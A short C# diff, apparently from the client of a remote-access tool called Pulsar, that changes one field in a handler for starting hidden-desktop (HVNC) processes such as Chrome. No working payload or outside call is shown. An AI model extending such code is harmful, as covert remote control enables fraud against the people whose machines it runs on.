@@ -274,7 +274,7 @@ namespace Pulsar.Client.Messages
 
         private void Execute(ISender client, StartHVNCProcess message)
         {
-            string name = message.Application;
+            string name = message.Path;
             var processActions = new Dictionary<string, Action>
             {
                 { "Chrome", ProcessHandler.Startchrome },
